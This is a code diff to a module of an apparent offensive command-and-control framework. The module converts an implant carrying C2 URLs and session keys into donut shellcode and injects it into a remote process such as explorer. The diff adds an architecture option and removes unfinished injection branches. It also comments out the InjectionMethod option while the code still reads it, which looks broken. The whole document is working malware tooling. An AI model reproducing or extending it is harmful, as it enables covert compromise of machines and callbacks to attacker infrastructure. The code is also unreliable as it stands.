@@ -26,11 +26,16 @@ class STModule(Module):
                 'Required'      :   False,
                 'Value'         :   'explorer'
             },
-            'InjectionMethod': {
-                'Description'   :   'Injection Method',
+            'Architecture' : {
+                'Description'   :   'Architecture of process to inject into (x64 or x86) [Warning: getting this wrong will crash things]',
                 'Required'      :   False,
-                'Value'         :   'InjectRemote'
+                'Value'         :   'x64'
             }
+            #'InjectionMethod': {
+            #    'Description'   :   'Injection Method',
+            #    'Required'      :   False,
+            #    'Value'         :   'InjectRemote'
+            #}
         }
 
     def payload(self):
@@ -44,7 +49,7 @@ class STModule(Module):
             psk = gen_stager_psk()
             ipc_server.publish_event(events.SESSION_REGISTER, (guid, psk))
 
-            donut_shellcode = donut.create(file='./core/teamserver/data/naga.exe', params=f"{guid};{psk};{c2_urls}", arch=2)
+            donut_shellcode = donut.create(file='./core/teamserver/data/naga.exe', params=f"{guid};{psk};{c2_urls}", arch=2 if self.options['Architecture']['Value'] == 'x64' else 1)
             shellcode = shellcode_to_int_byte_array(donut_shellcode)
             if self.options['InjectionMethod']['Value'] == 'InjectRemote':
                 with open('core/teamserver/modules/boo/src/injectremote.boo', 'r') as module_src:
@@ -52,11 +57,5 @@ class STModule(Module):
                     src = src.replace('BYTES', shellcode)
                     src = src.replace('PROCESS', self.options['Process']['Value'])
                     return src
-
-            elif self.options['InjectionMethod']['Value'] == 'QueueUserAPC':
-                raise NotImplemented
-
-            elif self.options['InjectionMethod']['Value'] == 'InjectSelf':
-                raise NotImplemented
         else:
             print_bad(f"Listener '{self.options['Listener']['Value']}' not found!")
